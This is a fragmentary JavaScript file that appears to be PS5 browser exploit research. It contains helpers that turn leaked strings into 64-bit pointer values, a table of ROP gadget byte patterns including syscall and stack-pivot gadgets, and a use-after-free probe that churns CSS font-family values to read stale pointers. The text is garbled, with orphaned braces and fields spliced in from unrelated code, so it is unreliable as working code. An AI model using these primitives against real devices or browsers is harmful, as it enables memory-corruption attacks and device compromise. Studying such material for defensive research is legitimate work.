var Mem = {
    // String to hex bytes (little-endian decode)
    strToHex: function(str, maxLen) {
        if (!maxLen) maxLen = str.length;
        var hex = "";
        for (var i = 0; i < Math.min(str.length, maxLen); i++) {
            var code = str.charCodeAt(i);
            var h = (code & 0xFF).toString(16);
            hex += (h.length === 1 ? "0" + h : h) + " ";
        }
        return hex.trim();
    },
    
    // String to 64-bit value (little-endian, first 8 chars)
    strToU64: function(str) {
        if (!str || str.length < 1) return 0n;
        var val = 0n;
        for (var i = 0; i < Math.min(str.length, 8); i++) {
            var code = BigInt(str.charCodeAt(i) & 0xFF);
            val |= (code << BigInt(i * 8));
        }
        return val;
    },
    
    // Check if value looks like a pointer
    isPointer: function(val) {
        if (typeof val !== "bigint") return false;
        var hi = Number(val >> 32n);
        var lo = Number(val & 0xFFFFFFFFn);
        // PS5 userland pointers typically have hi=0x0000 or hi=0x0001
        if (hi === 0 || hi === 1) return lo > 0x10000;
        // Kernel pointers have hi=0xFFFF
        if (hi === 0xFFFF) return true;
        return false;
    },
    
    // Format bigint as hex
    bigToHex: function(val) {
        return "0x" + val.toString(16).padStart(16, "0");
    },
    
    // Check if bytes contain ROP gadget patterns
    findGadgets: function(hexStr) {
        var gadgets = {
            "5f c3": "pop rdi; ret",
            "5e c3": "pop rsi; ret",
            "5a c3": "pop rdx; ret",
            "58 c3": "pop rax; ret",
            "59 c3": "pop rcx; ret",
            "41 58 c3": "pop r8; ret",
            "41 59 c3": "pop r9; ret",
            "0f 05 c3": "syscall; ret",
            "0f 05": "syscall",
            "c3": "ret",
            "48 87 e3": "xchg rsp, rbx",
            "48 94": "xchg rsp, rax",
        };
        var found = [];
        var lower = hexStr.toLowerCase().replace(/\s/g, "");
        for (var pattern in gadgets) {
            var cleanPattern = pattern.replace(/\s/g, "");
            var idx = lower.indexOf(cleanPattern);
            if (idx !== -1 && idx % 2 === 0) {
                found.push({
                    offset: idx / 2,
                    bytes: pattern,
                    name: gadgets[pattern]
                });
            }
        }
        return found;
    }
};

                          });

            aStyle.setProperty("font-family", writeVal); fs();

                        writeVal: writeDisplay,
                        offset: gadgets[gi].offset,
                        bytes: gadgets[gi].bytes,
                        name: gadgets[gi].name,

    // Rapidly change family to force CSSValueList allocation/deallocation

        try {

            var rv = aFace.family;

            var u64 = Mem.strToU64(rv);
            var isPtr = Mem.isPointer(u64);

                P("  Cycle " + ci + ": MISMATCH!", "wr");
                P("    Expected: cycle_" + ci, "dm");
                P("    Got: " + (/[^\x20-\x7E]/.test(rv) ? "(non-ASCII)" : rv), "dm");
                P("    Hex: " + hex, "dm");
                if (isPtr) Hi("    PTR: " + Mem.bigToHex(u64));
                
                cycleResults.push({
                    cycle: ci,
                    expected: "cycle_" + ci,
                    got: rv,
                    hex: hex,
                    ptr: isPtr ? Mem.bigToHex(u64) : null
                });
            }
        } catch(e) {}
    }
    
    if (cycleResults.length > 0) {
        St("  " + cycleResults.length + " mismatches detected — possible stale pointer reads!");
